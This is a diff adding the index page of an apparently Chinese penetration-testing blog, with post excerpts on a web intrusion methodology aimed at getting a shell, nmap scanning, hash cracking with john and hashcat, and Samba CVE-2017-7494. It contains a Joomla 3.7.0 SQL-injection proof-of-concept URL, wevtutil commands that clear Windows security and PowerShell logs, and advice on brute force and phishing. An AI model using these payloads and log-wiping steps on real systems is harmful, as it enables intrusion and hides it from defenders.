@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="klion&#39;s blog"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">klion's blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/20/web-pentest-options/">
+                web渗透基本流程小结 [ 边界1 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/web-pentest/">web pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="如果是某种开源程序-诸如-wordpress-drupal-joomla-discuz-SquirrelMail……"><a href="#如果是某种开源程序-诸如-wordpress-drupal-joomla-discuz-SquirrelMail……" class="headerlink" title="如果是某种开源程序[诸如,wordpress,drupal,joomla,discuz,SquirrelMail……]:"></a>如果是某种开源程序[诸如,wordpress,drupal,joomla,discuz,SquirrelMail……]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先想办法确定对应的具体版本,然后去找下该版本曾经的一些exp并尝试利用,在此之前,务必自己先在本地测成功以后,再到目标上搞</div><div class="line">另外,你可能需要对各种开源程序拿shell的方式尽量熟悉</div></pre></td></tr></table></figure>
+<h5 id="针对非开源程序-应该尽量先奔着一些比较高危的漏洞去-因为我们最终的目的还是想快速getshell-没必要在一些边缘性的漏洞上浪费太多的时间"><a href="#针对非开源程序-应该尽量先奔着一些比较高危的漏洞去-因为我们最终的目的还是想快速getshell-没必要在一些边缘性的漏洞上浪费太多的时间" class="headerlink" title="针对非开源程序[应该尽量先奔着一些比较高危的漏洞去,因为我们最终的目的还是想快速getshell,没必要在一些边缘性的漏洞上浪费太多的时间]:"></a>针对非开源程序[应该尽量先奔着一些比较高危的漏洞去,因为我们最终的目的还是想快速getshell,没必要在一些边缘性的漏洞上浪费太多的时间]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">首先,找好目标站的各种web入口[不仅限后台,如,各种数据库的web管理程序(phpmyadmin),各类java控制台……],然后手工先简单尝试些弱口令[尽量多试几个,没有验证码的情况下,可以尝试爆破],万能密码[sql注入的一种,平时多搜集一些],未授权访问[有些后台可能会出现这样的情况,页面权限控制不好所致]</div><div class="line">找目标网站上的各种上传点[包括扫各种漏洞编辑器路径],挨个进行尝试上传……</div><div class="line">多翻翻目标站,然后观察下请求,尝试利用下可能存在包含或者任意文件读取[如,xxe]的各种参数</div><div class="line">同样是看请求,找各种可能存在执行的参数,如果不是直接审代码,单靠盲测[想成功拼接利用还是比较困难的,起码我自己还没有这么成功过,嘿嘿……],除非一些非常特殊的功能,差不多能一眼看出来</div><div class="line">扫下目标的svn,如果可以利用的话,看看能不能从里面下载到一些目标的敏感配置文件什么的,主要想拿一些账号密码</div><div class="line">找各种可能存在sql注入的参数,慢慢尝试,观察目标响应</div><div class="line">尝试找一些下载点,看看能不能把目标的脚本文件也给下下来</div><div class="line">找目录遍历,看能不能看到一些目标的敏感文件什么的,比如,各种网站,数据库的备份文件,各类探针文件,密码文件,源码泄露等等……顺手给下下来</div><div class="line">实在不能遍历,可以直接用字典[前提是字典要靠谱才行]或者wvs,慢慢跑一下目标站的各种敏感目录文件</div><div class="line">如果目标站起来的时间比较长的话,也可以利用谷歌来爬一些敏感参数,文件及网站错误什么的</div><div class="line">看有没有好下手点儿的子域,尝试从那儿进去也是可以的</div><div class="line">观察目标站到底用的那种web服务器是什么版本的,看看有没有一些可以快速远程利用的exp,比如,tomcat,apache,iis[<span class="number">6.0</span>] 的各种RCE……</div><div class="line">如果目标用网站是基于某种框架[strus2,tp……],可以先确定其对应的具体框架版本,然后去找一些针对此框架的exp尝试利用,还是那句话,自己在本地测成功了,再丢到目标上搞</div><div class="line">再如果,目标用的是一些比较不知名的小众开源程序[嘿嘿……像wp,joomla,或者drupal这种全球知名的就算了吧,暂时没必要花那个时间],在上面这些办法都搞不定的情况下,可以尝试把目标程序的代码down下来,花点时间好好审一下,好好能不能有所突破</div><div class="line">如果你实在觉得,自己这样手工搞希望不大,不妨直接丢给各种web wvs 去自己扫就好了,记得尽量把高危的一些规则集事先更新一下,切忌慢慢扫[别着急],避免一些不必要的麻烦</div><div class="line">如果上面的这些还不太好使,这是可以先确定目标站的真实ip[务必是目标站的真实ip],然后再想办法从旁站搞,如果旁站也不行,可以再试试C段[包括C段的web和端口(尤其是sa),实在没办法再试这个,如果都是linux的虚拟机说实话,不太好提]</div><div class="line">关于xss的利用,这里就不多说了,因为个人确实不太擅长方面[对自己现有的目标想利用太难了],不过需要你自己先把xss平台搭起来,一般在我自己的目标里,xss还是蛮多的,但利用比较困难,实际给目标发信的效果也并不太好[可能是太多人发过太多次了吧,人基本都不鸟你了],利用这种方式来getshell还是比较曲折的,当然,并不是说它没有用,相反,如果用好了,还是非常牛逼的……</div><div class="line">当你把这些都尝试完[可能此时已经过了一个多星期了或者更长时间],依旧一无所获,别伤心,因为还有端口没试过呢,扫下目标站都跑了什么服务[这里务必是真实目标ip],尝试利用下各种漏洞服务,实在不行,起码你还可以爆破[前提是字典务必要精心做,在前面大量的信息搜集中,相信你已经拿到了一些敏感信息,然后你可以根据已搜集到的这些信息来做字典]</div><div class="line">如果你实在觉得端口也没什么希望了,不妨尝试爆破下目标域名的注册邮箱,虽然稍微有点儿偏离目标了,好歹也是个入手点,万一成功了呢,至于后续的劫持社工什么的就要看你自己的了</div><div class="line">一边搜集目标邮箱,撞密码,一边找目标的各种内网入口[如,vpn,owa……][如果你确定目标有内网],尝试登陆</div><div class="line">如果以上方式全废,而且你手里又没有可以直接远程利用的0day的情况下,发信吧,简单,粗暴,直接,收获快,虽然现在希望已经越来越小,但万一上了呢,总归是个突破口</div><div class="line">当然,真的有条件的情况下,尝试路由或者实地无线渗透,也是可行的[不过,中间还是有很多不确定因素,需要相互配合],因为有很多东西,自己目前暂时还在学习中,这里不多说了</div><div class="line">说了这么多废话,其实就想告诉大家,一直保持住自己良好的学习习惯,不断巩固更新自己现有的知识深度,这比任何技巧都重要 [相信所有的复杂都是简单的堆积]</div><div class="line">这里纯粹就是自己的一点点经验小结,因为个人能力实在有限,其中有很多很多的不足是肯定的,虽然这里说的貌似很容易,但实际渗透中,远非如此,还有很多各种各样的问题,等着我们慢慢去解决,自己也一直在努力学习中,希望表哥们能多多提携……</div><div class="line">待续……</div></pre></td></tr></table></figure>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/19/wevtutil/">
+                针对 win 安全日志的简单处理 [权限要高是必须的],实际渗透中不应该是第一选择
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/wevtutil/">wevtutil</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<p>1,作为后渗透中的重要组成部分,可能很多朋友在实际渗透中,貌似对它都不怎么上心[但确实又很重要],利用win带的 wevtutil 日志管理工具[win 7以后自带,03之前的系统就不说了吧,大家都很熟悉了]可以很方便[‘太方便了’]的帮我们处理一些敏感的系统安全类日志,既然涉及到系统安全审计,’管理员权限’ 自然是少不了的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wevtutil el | more 			 	查看系统日志列表项</span></div><div class="line"><span class="comment"># wevtutil cl "windows powershell" 		清除powershell日志</span></div><div class="line"><span class="comment"># wevtutil cl "security" 	 		清除系统安全日志</span></div><div class="line"><span class="comment"># wevtutil cl "system"     			清除系统日志</span></div><div class="line"><span class="comment"># wevtutil cl "application"  			清除应用程序日志</span></div><div class="line">……</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/05/19/wevtutil/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/18/nmap-script/">
+                nmap 进阶使用 [ 脚本篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/nmap/">nmap</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="首先-先大致探测下目标机器都跑了什么服务-心里需要先大致有个谱"><a href="#首先-先大致探测下目标机器都跑了什么服务-心里需要先大致有个谱" class="headerlink" title="首先,先大致探测下目标机器都跑了什么服务,心里需要先大致有个谱:"></a>首先,先大致探测下目标机器都跑了什么服务,心里需要先大致有个谱:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -sV -sT -Pn -v 192.168.3.23</span></div></pre></td></tr></table></figure>
+<h5 id="尝试获取机器各个服务详细的banner"><a href="#尝试获取机器各个服务详细的banner" class="headerlink" title="尝试获取机器各个服务详细的banner:"></a>尝试获取机器各个服务详细的banner:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -sT -Pn -v banner.nse 192.168.3.23</span></div></pre></td></tr></table></figure>
+<h5 id="ftp相关的一些漏洞检测脚本"><a href="#ftp相关的一些漏洞检测脚本" class="headerlink" title="ftp相关的一些漏洞检测脚本:"></a>ftp相关的一些漏洞检测脚本:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ftp-anon.nse	检查目标的ftp是否允许匿名登录,光能登陆还不够,它还会自动检测是否可读写,批量抓ftp肉鸡,可用</div><div class="line"><span class="comment"># nmap -p 21 --script ftp-anon.nse -v 192.168.3.23</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2017/05/18/nmap-script/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
+                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/joomla-exp/">joomla exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
+<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
+        </div>
+        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/15/PS1/">
+                烦躁ing……,拿PS1撒撒气
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/PS1/">PS1</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="最近有些烦躁-调了个好看的PS1-发泄下-顺便分享给大家"><a href="#最近有些烦躁-调了个好看的PS1-发泄下-顺便分享给大家" class="headerlink" title="最近有些烦躁,调了个好看的PS1,发泄下,顺便分享给大家:"></a>最近有些烦躁,调了个好看的PS1,发泄下,顺便分享给大家:</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd </div><div class="line"># vi .bash_profile   把PS1换成下面的语句</div><div class="line">	PS1="<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[35m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\[</span><span class="symbol">\0</span>33[36m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\0</span>33[32m<span class="symbol">\]</span><span class="symbol">\h</span> :)<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[33;1m<span class="symbol">\]</span><span class="symbol">\w</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> =&gt; "</div><div class="line"># source .bash_profile</div></pre></td></tr></table></figure>
+<p><img src="/img/PS1.png" alt=""><br>
+        </div>
+        <a href="/2017/05/15/PS1/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/26/use-john/">
+                快速破解各种散列hash [ john入门篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/john/">john</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="尝试在centOS-7-上编译安装john-1-8-当然啦-有已经编译好的win版-像类似的hash破解工具-不用说-单独找个性能好点的机器是必须的-要不-意义何在呢"><a href="#尝试在centOS-7-上编译安装john-1-8-当然啦-有已经编译好的win版-像类似的hash破解工具-不用说-单独找个性能好点的机器是必须的-要不-意义何在呢" class="headerlink" title="尝试在centOS 7 上编译安装john 1.8[当然啦,有已经编译好的win版],像类似的hash破解工具,不用说,单独找个性能好点的机器是必须的,要不,意义何在呢:"></a>尝试在centOS 7 上编译安装john 1.8[当然啦,有已经编译好的win版],像类似的hash破解工具,不用说,单独找个性能好点的机器是必须的,要不,意义何在呢:</h5><p>1,至于编译安装的过程就非常简单了,为了快速进行这一过程,语句我已经事先都放到脚本里了,执行即可,脚本很粗糙,你可以自己在完善下,起码加个命令执行结果检查还是非常有必要的:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#/bin/bash</div><div class="line">yum -y install wget gpgme</div><div class="line">yum -y group install "Development Tools"</div><div class="line">cd</div><div class="line">wget http://www.openwall.com/john/j/john-1.8.0.tar.xz</div><div class="line">wget http://www.openwall.com/john/j/john-1.8.0.tar.xz.sign</div><div class="line">wget http://www.openwall.com/signatures/openwall-signatures.asc</div><div class="line">gpg --import openwall-signatures.asc</div><div class="line">gpg --verify john-1.8.0.tar.xz.sign</div><div class="line">tar xvfJ john-1.8.0.tar.xz</div><div class="line">cd john-1.8.0/src</div><div class="line">make clean linux-x86-64</div><div class="line">cd ../run/</div><div class="line">./john --test # 主要用来测试当前系统的破解速度</div><div class="line"></div><div class="line"># chmod +x johninstall.sh 别忘了给下执行权限</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/26/use-john/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/25/use-hashcat-crack-hash/">
+                快速破解各种散列hash [ hashcat入门篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/hashcat/">hashcat</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>一些相对好用的在线hash破解站点[其实还有很多,比如,各种开源php程序在线hash破解,ntlm在线hash破解,cisco在线破解,等等……不过都不太靠谱,后期遇到靠谱的会补上来]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/cmd5.com  虽然支持的类型比较少,不过还好吧,如果真不在乎那点儿钱,不妨用它就好了,后端估计也是分布式跑的[自己猜的,嘿嘿……现在有钱了,自然就上好设备了]</span></div></pre></td></tr></table></figure></p>
+<p>如果你实在搞不清楚某个hash的具体散列类型,可以先用下面的脚本大致识别下,虽然不大准,但粗略的看一眼还是可以的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">hash</span>-identifier  <span class="built_in">hash</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hash-indeifer.png" alt=""><br><br>
+        </div>
+        <a href="/2017/04/25/use-hashcat-crack-hash/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/25/samba-rce/">
+                Samba RCE 利用小记 [ CVE-2017-7494 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/CVE/">CVE</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,Samba 远程执行快速利用小结 CVE-2017-7494,至于samba是什么,我就不科普了[说白点儿就是个win和linux机器共享文件的服务,企业里面已经用到烂的东西],直接看过程吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">漏洞影响Samba <span class="number">3.5</span>.<span class="number">0</span> 之后到<span class="number">4.6</span>.<span class="number">4</span>/<span class="number">4.5</span>.<span class="number">10</span>/<span class="number">4.4</span>.<span class="number">14</span>中间的所有版本</div></pre></td></tr></table></figure></p>
+<p>2,关于漏洞的简要描述,说的通俗一点就是’允许samba用户上传自己的类库到可读写的samba目录中’所导致的远程执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/www.samba.org/samba</span><span class="regexp">/security/</span>CVE-<span class="number">2017</span>-<span class="number">7494</span>.html</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/25/samba-rce/" class="read-more">Read More</a>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
